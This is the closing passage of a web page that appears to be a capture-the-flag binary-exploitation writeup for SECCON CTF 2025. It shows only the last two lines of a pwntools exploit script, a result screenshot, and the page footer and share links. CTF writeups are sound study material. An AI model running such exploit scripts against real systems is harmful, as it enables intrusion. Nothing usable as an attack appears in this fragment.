</span></span><span class=line><span class=cl><span class=n>T_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p><img alt=image-20251215225824693 loading=lazy src=/posts/ctf/secconctf2025-writeup/assets/image-20251215225824693.png></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=https://wgggggggg.github.io/posts/ctf/backdoorctf2025-writeup/><span class=title>Next »</span><br><span>backdoorCTF2025 PWN Writeup</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share secconCTF2025 PWN Writeup' on x" href="https://x.com/intent/tweet/?text=secconCTF2025%20PWN%20Writeup%27&amp;url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fsecconctf2025-writeup%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share secconCTF2025 PWN Writeup' on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fsecconctf2025-writeup%2f&amp;title=secconCTF2025%20PWN%20Writeup%27&amp;summary=secconCTF2025%20PWN%20Writeup%27&amp;source=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fsecconctf2025-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share secconCTF2025 PWN Writeup' on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fsecconctf2025-writeup%2f&title=secconCTF2025%20PWN%20Writeup%27"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share secconCTF2025 PWN Writeup' on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fsecconctf2025-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share secconCTF2025 PWN Writeup' on whatsapp" href="https://api.whatsapp.com/send?text=secconCTF2025%20PWN%20Writeup%27%20-%20https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fsecconctf2025-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share secconCTF2025 PWN Writeup' on telegram" href="https://telegram.me/share/url?text=secconCTF2025%20PWN%20Writeup%27&amp;url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fsecconctf2025-writeup%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share secconCTF2025 PWN Writeup' on ycombinator" href="https://news.ycombinator.com/submitlink?t=secconCTF2025%20PWN%20Writeup%27&u=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fsecconctf2025-writeup%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://wgggggggg.github.io/>Wgg's Blog Site</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>